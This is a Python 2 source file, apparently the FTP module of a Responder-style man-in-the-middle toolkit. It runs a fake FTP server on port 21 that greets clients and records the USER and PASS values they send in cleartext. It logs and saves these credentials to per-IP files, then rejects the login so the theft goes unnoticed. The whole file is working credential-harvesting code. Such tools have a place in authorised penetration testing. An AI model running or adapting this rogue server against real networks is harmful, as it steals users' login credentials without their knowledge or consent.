import socket
import threading
import logging

from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
from core.responder.packet import Packet
from core.responder.odict import OrderedDict
from core.responder.common import *
from core.logger import logger

formatter = logging.Formatter("%(asctime)s [FTPserver] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("FTPserver", formatter)

class FTPserver():
	
	def start(self):
		try:
			log.debug("online")
			server = ThreadingTCPServer(("0.0.0.0", 21), FTP)
			t = threading.Thread(name="FTPserver", target=server.serve_forever)
			t.setDaemon(True)
			t.start()
		except Exception, e:
			log.error("Error starting on port {}: {}".format(21, e))

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)

class FTPPacket(Packet):
	fields = OrderedDict([
		("Code",           "220"),
		("Separator",      "\x20"),
		("Message",        "Welcome"),
		("Terminator",     "\x0d\x0a"),
	])

#FTP server class.
class FTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(FTPPacket()))
			data = self.request.recv(1024)
			if data[0:4] == "USER":
				User = data[5:].replace("\r\n","")
				log.info('{} FTP User: {}'.format(self.client_address[0], User))
				t = FTPPacket(Code="331",Message="User name okay, need password.")
				self.request.send(str(t))
				data = self.request.recv(1024)
			if data[0:4] == "PASS":
				Pass = data[5:].replace("\r\n","")
				Outfile = "./logs/responder/FTP-Clear-Text-Password-"+self.client_address[0]+".txt"
				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
				log.info('{} FTP Password is: {}'.format(self.client_address[0], Pass))
				t = FTPPacket(Code="530",Message="User not logged in.")
				self.request.send(str(t))
				data = self.request.recv(1024)
			else :
				t = FTPPacket(Code="502",Message="Command not implemented.")
				self.request.send(str(t))
				data = self.request.recv(1024)
		except Exception as e:
			log.error("Error handling request: {}".format(e))